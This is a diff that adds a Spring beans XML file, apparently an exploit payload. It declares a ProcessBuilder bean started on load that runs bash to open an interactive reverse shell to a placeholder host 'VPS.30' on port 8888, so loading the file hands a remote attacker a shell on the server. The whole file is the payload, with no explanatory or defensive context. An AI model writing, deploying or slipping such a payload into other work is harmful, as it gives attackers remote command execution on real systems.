@@ -1,0 +1,14 @@
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg type="java.util.List">
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[/bin/bash -i >& /dev/tcp/VPS.30/8888 0>&1]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+</beans>
